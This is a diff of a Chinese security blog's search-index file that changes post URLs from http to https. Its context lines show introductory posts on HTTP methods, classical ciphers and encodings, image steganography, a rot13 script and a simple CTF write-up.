 <h3 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h3><p>（1）OPTIONS：该办法可使服务器传回该资源所支持的所有HTTP请求方法。用‘*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。<br>（2）HEAD:与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）<br>（3）GET:向指定资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，如在Web Application中，其中一个原因就是GET可能会被网络蜘蛛等随意访问。<br>（4）POST:向指定资源提交数据，请求服务器进行处理（如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。<br>（5）PUT：向指向资源位置上传其最新内容。<br>（6）DELETE：请求服务器删除Request-URI所标识的资源。<br>（7）TRACE：回显服务器收到的请求，主要用于测试或诊断。<br>（8）CONNECT:HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。<br>以下是一个典型的HTTP GET 请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/4.0(compatible; MSIE 8.0; Windows NT 6.0)</span><br><span class="line">Host: www.bit.edu.cn</span><br><span class="line">Accept: text/html</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Accept-Rncoding: gzip,deflate</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Cookie: SessionId= ICONFPDBEPOBLFFGBKKNCGAL</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure></p>
 <p>其中，请求的第一行都是由3个以空格间隔的项目组成，分别是请求方法、请求路径、和HTTP版本。其他一些常见的消息头如下。<br>（1）Referer消息头用于表示发出请求的原始URL。<br>（2）User-Agent消息头提供与浏览器或其他请求的客户端软件有关的信息。<br>（3）Host消息头用于指定出现被访问的完整URL中的主机名称。<br>（4）Cookie消息头用于提交服务器向客户端发布的其他参数。</p>
@@ -10526,7 +10526,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[2016-08-28]]></title>
-      <url>http://uknowsec.cn/posts/life/2016-08-28.html</url>
+      <url>https://uknowsec.cn/posts/life/2016-08-28.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上结识一个今年大四的南京大表哥。跟他聊了很多，有感遂写下这篇博文。</p>
 <h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p>明天就是大二了，大一一年感觉自己有点混。学习上混，自己想接触的领域也比较混。大一经历了很多，第一次来到南京这个陌生的城市。第一次接触到“信息安全”的名词，第一个想以后从事这个行业的决定。我自己现在也不知道这是个冲动还是我兴趣使然，内心使然。正如TK教主曾经说的：“如果你对于安全这个行业仅仅是为了赚一口饭，那无异于一个性冷淡拍AV。如果你是真正的对于一种技术的追崇，让你会无限的提高，永远对于他有一种新鲜感。”兴趣使然，我依旧坚持自己的选择。我毅不忘初心，亦望始终可得。大一懒懒散散的过去了，从我初了解到这个领域的时候。都是一些小打小闹，在各大论坛也说不得是摸爬滚打。我自己甚至也不知道自己有没有在这过去一年之中学到了技术上的一些东西，结识到一些有益的朋友。这一年自己接触到技术上的问题很浅显，之前一个跟我聊天的学长也提醒过我：“这是一个浮躁的行业，浮躁的人喜欢急功近利，刚刚追求表面”在我听到这句话时，的确给我狠狠的以一巴掌。急功近利地去挖掘漏洞而不了解他的原理，急功近利地去使用他人写的工具而不能自己了解而后改善之，急功近利地卖弄而不能脚踏实地地学习等。大一的暑假也是匆匆忙忙简简单单学习了一下python和PHP的内容，另外也做了一些CTF关于WEB方面的练习，结识了一些打CTF比赛的小伙伴。之前也是踌躇满志地想在暑假提高自己的能力，然后我并没感觉到效果。又是一个新的学期，在这个学期第一天的前夕。还是给自己定下一些目标和计划吧。首先应该是四级吧，先每天做几个题目把它给搞定吧。然后就是上个学期我在图书馆推荐了不少关于安全类的书籍差不多应该可以到馆了吧，尽力去借来看看。还有Python和PHP的内容继续进行学习吧。关于自己专业课方面尽力学好，期末不挂科吧。最后昨天晚上那大四学长跟我说自己拉人组Team的问题，这个可能真的是我之前不敢想的一个事情，但是他给我了不少的鼓励。我也是跃跃欲试的，但是感觉心有余而力不足吧。我个人的能力还是不行的，这种Team在学校搞起来怕也很难发展并不能得到相关方面的支持。还是自己先学习好技术吧，待到时机成熟，也说不定。言至此。</p>
 <h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h2><p>这篇博文算是我大一的一个学期的总结和大二新的计划和目标的先行书吧，望以此勉之。</p>
@@ -10543,7 +10543,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[ 2016年X-NUCA全国高校网安联赛--赛前指导练习题web进阶篇Writeup ]]></title>
-      <url>http://uknowsec.cn/posts/ctf/2016%E5%B9%B4X-NUCA%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/2016%E5%B9%B4X-NUCA%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一次写Writeup，尝试一下吧！</p>
 <h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>捉迷藏<br>描述：从页面中找到隐藏的flag<br><a href="http://218.76.35.75:20111" target="_blank" rel="noopener">题目链接</a></p>
 <h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%871.png" alt=""><br>F12审查元素发现有一个Index.php的链接，把背景去掉。点击链接得到flag</p>
@@ -10691,7 +10691,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[CTF中那些脑洞大开的编码和加密]]></title>
-      <url>http://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86.html</url>
+      <url>https://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86.html</url>
       <content type="html"><![CDATA[<h1 id="CTF中那些脑洞大开的编码和加密"><a href="#CTF中那些脑洞大开的编码和加密" class="headerlink" title="CTF中那些脑洞大开的编码和加密"></a>CTF中那些脑洞大开的编码和加密</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:表哥，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。本来是想尽快写出参考的文章，无奈期间被各种事情耽搁导致文章断断续续写了2个月，文章肯定有许多没有提及到，欢迎小伙伴补充，总之，希望对小伙伴们有帮助吧！</p>
 <h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">常见编码:</span><br><span class="line">    1.ASCII编码</span><br><span class="line">    2.Base64/32/16编码</span><br><span class="line">    3.shellcode编码</span><br><span class="line">    4.Quoted-printable编码</span><br><span class="line">    5.XXencode编码</span><br><span class="line">    6.UUencode编码</span><br><span class="line">    7.URL编码</span><br><span class="line">    8.Unicode编码</span><br><span class="line">    9.Escape/Unescape编码</span><br><span class="line">    10.HTML实体编码</span><br><span class="line">    11.敲击码(Tap code)</span><br><span class="line">    12.莫尔斯电码(Morse Code)</span><br><span class="line">    13.编码的故事</span><br><span class="line"> </span><br><span class="line">各种文本加密</span><br><span class="line"> </span><br><span class="line">换位加密:</span><br><span class="line">    1.栅栏密码(Rail-fence Cipher)</span><br><span class="line">    2.曲路密码(Curve Cipher)</span><br><span class="line">    3.列移位密码(Columnar Transposition Cipher)</span><br><span class="line">     </span><br><span class="line">替换加密:</span><br><span class="line">    1.埃特巴什码(Atbash Cipher)</span><br><span class="line">    2.凯撒密码(Caesar Cipher)</span><br><span class="line">    3.ROT5/13/18/47</span><br><span class="line">    4.简单换位密码(Simple Substitution Cipher)</span><br><span class="line">    5.希尔密码(Hill Cipher)</span><br><span class="line">    6.猪圈密码(Pigpen Cipher)</span><br><span class="line">    7.波利比奥斯方阵密码（Polybius Square Cipher)</span><br><span class="line">    8.夏多密码(曲折加密)</span><br><span class="line">    9.普莱菲尔密码(Playfair Cipher)</span><br><span class="line">    10.维吉尼亚密码(Vigenère Cipher)</span><br><span class="line">    11.自动密钥密码(Autokey Cipher)</span><br><span class="line">    12.博福特密码(Beaufort Cipher)</span><br><span class="line">    13.滚动密钥密码(Running Key Cipher)</span><br><span class="line">    14.Porta密码(Porta Cipher)</span><br><span class="line">    15.同音替换密码(Homophonic Substitution Cipher)</span><br><span class="line">    16.仿射密码(Affine Cipher)</span><br><span class="line">    17.培根密码(Baconian Cipher)</span><br><span class="line">    18.ADFGX和ADFGVX密码(ADFG/VX Cipher)</span><br><span class="line">    19.双密码(Bifid Cipher)</span><br><span class="line">    20.三分密码(Trifid Cipher)</span><br><span class="line">    21.四方密码(Four-Square Cipher)</span><br><span class="line">    22.棋盘密码（Checkerboard Cipher)</span><br><span class="line">    23.跨棋盘密码(Straddle Checkerboard Cipher)</span><br><span class="line">    24.分组摩尔斯替换密码(Fractionated Morse Cipher)</span><br><span class="line">    25.Bazeries密码(Bazeries Cipher)</span><br><span class="line">    26.Digrafid密码(Digrafid Cipher)</span><br><span class="line">    27.格朗普雷密码(Grandpré Cipher)</span><br><span class="line">    28.比尔密码(Beale ciphers)</span><br><span class="line">    29.键盘密码(Keyboard Cipher)</span><br><span class="line"> </span><br><span class="line">其他有趣的机械密码:</span><br><span class="line">    1.恩尼格玛密码</span><br><span class="line"> </span><br><span class="line">代码混淆加密:</span><br><span class="line">    1.asp混淆加密</span><br><span class="line">    2.php混淆加密</span><br><span class="line">    3.css/js混淆加密</span><br><span class="line">    4.VBScript.Encode混淆加密</span><br><span class="line">    5.ppencode</span><br><span class="line">    6.rrencode</span><br><span class="line">    7.jjencode/aaencode</span><br><span class="line">    8.JSfuck</span><br><span class="line">    9.jother</span><br><span class="line">    10.brainfuck编程语言</span><br><span class="line"> </span><br><span class="line">相关工具</span><br><span class="line"> </span><br><span class="line">参考网站</span><br></pre></td></tr></table></figure>
 <h2 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h2><h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><h4 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1.ASCII编码"></a>1.ASCII编码</h4><p>ASCII编码大致可以分作三部分组成：</p>
@@ -11308,7 +11308,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[CTF中图片隐藏文件分离方法总结]]></title>
-      <url>http://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/ctf/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h1 id="CTF中图片隐藏文件分离方法总结"><a href="#CTF中图片隐藏文件分离方法总结" class="headerlink" title="CTF中图片隐藏文件分离方法总结"></a>CTF中图片隐藏文件分离方法总结</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在安全的大趋势下，信息安全越来越来受到国家和企业的重视，所以CTF比赛场次越来越多，而且比赛形式也不断的创新，题目也更加新颖有趣，对选手的综合信息安全能力有一个较好的考验，当然更好的是能从比赛有所收获，不断学习和总结提升自己的信息安全能力与技术。转到CTF比赛上，通常在CTF比赛中常有与隐写术(Steganography)相关的题目出现，这里我们讨论总结图片隐藏文件分离的方法，欢迎大家补充和交流:P</p>
 <h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>这里我们以图片为载体，给了这样的一样图片：</p>
 <p><img src="https://www.hackfun.org/usr/uploads/2016/07/1574897276.jpg" alt="CTF中图片隐藏文件分离方法总结"></p>
@@ -11369,7 +11369,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[深入理解JPEG图像格式Jphide隐写]]></title>
-      <url>http://uknowsec.cn/posts/ctf/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JPEG%E5%9B%BE%E5%83%8F%E6%A0%BC%E5%BC%8FJphide%E9%9A%90%E5%86%99.html</url>
+      <url>https://uknowsec.cn/posts/ctf/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JPEG%E5%9B%BE%E5%83%8F%E6%A0%BC%E5%BC%8FJphide%E9%9A%90%E5%86%99.html</url>
       <content type="html"><![CDATA[<h1 id="深入理解JPEG图像格式Jphide隐写"><a href="#深入理解JPEG图像格式Jphide隐写" class="headerlink" title="深入理解JPEG图像格式Jphide隐写"></a>深入理解JPEG图像格式Jphide隐写</h1><h2 id="0x00-隐写原理"><a href="#0x00-隐写原理" class="headerlink" title="0x00 隐写原理"></a>0x00 隐写原理</h2><p>Jphide是基于最低有效位LSB的<a href="http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html" target="_blank" rel="noopener">JPEG格式</a>图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在<a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform" target="_blank" rel="noopener">DCT变换域</a>上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时<a href="http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq" target="_blank" rel="noopener">Blowfish算法</a>有较强的抗统计检测能力。</p>
 <p>由于JPEG图像格式使用<a href="http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn" title="DCT&amp;fromid=4184&amp;type=syn" target="_blank" rel="noopener">离散余弦变换</a>（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种<a href="http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_" target="_blank" rel="noopener">有损压缩</a>（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
 <h2 id="0x01-隐写过程"><a href="#0x01-隐写过程" class="headerlink" title="0x01 隐写过程"></a>0x01 隐写过程</h2><p>Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。</p>
@@ -11442,7 +11442,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[CTF工具以及脚本的整理 ]]></title>
-      <url>http://uknowsec.cn/posts/ctf/CTF%E5%B7%A5%E5%85%B7%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%9C%AC%E7%9A%84%E6%95%B4%E7%90%86.html</url>
+      <url>https://uknowsec.cn/posts/ctf/CTF%E5%B7%A5%E5%85%B7%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%9C%AC%E7%9A%84%E6%95%B4%E7%90%86.html</url>
       <content type="html"><![CDATA[<h1 id="密码学-cryptology"><a href="#密码学-cryptology" class="headerlink" title="密码学 cryptology"></a><a href="#密码学-cryptology"></a>密码学 <code>cryptology</code></h1><p><a href="http://www.practicalcryptography.com/" target="_blank" rel="noopener">各种密码学的在线解密</a></p>
 <h2 id="简单的位移密码"><a href="#简单的位移密码" class="headerlink" title="简单的位移密码"></a><a href="#简单的位移密码"></a>简单的位移密码</h2><p><code>默认位移13 即rot13</code></p>
 <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-<em>- coding:utf-8 -</em>-</span></div><div class="line">str =raw_input(<span class="string">‘put flag:’</span>)</div><div class="line">new_str = <span class="string">“”</span></div><div class="line">yi = <span class="number">13</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">    <span class="keyword">if</span> i&gt;=<span class="string">‘a’</span> <span class="keyword">and</span> i&lt;=<span class="string">‘z’</span>:</div><div class="line">        i = ord(i)</div><div class="line">        i = ((i-yi)<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span></div><div class="line">        i = chr(i)</div><div class="line">        new_str = new_str+i</div><div class="line">        print(new_str)</div></pre></td></tr></tbody></table></figure>
@@ -11514,7 +11514,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[入CTF坑必不可少的地方]]></title>
-      <url>http://uknowsec.cn/posts/ctf/%E5%85%A5CTF%E5%9D%91%E5%BF%85%E4%B8%8D%E5%8F%AF%E5%B0%91%E7%9A%84%E5%9C%B0%E6%96%B9.html</url>
+      <url>https://uknowsec.cn/posts/ctf/%E5%85%A5CTF%E5%9D%91%E5%BF%85%E4%B8%8D%E5%8F%AF%E5%B0%91%E7%9A%84%E5%9C%B0%E6%96%B9.html</url>
       <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161004230538.jpg" alt="ctf"><br><strong>0x00 前言</strong></p>
 <p>没有交易，没有买卖，没有排名，纯属分享</p>
 <p><strong>0x01 CTF介绍</strong></p>
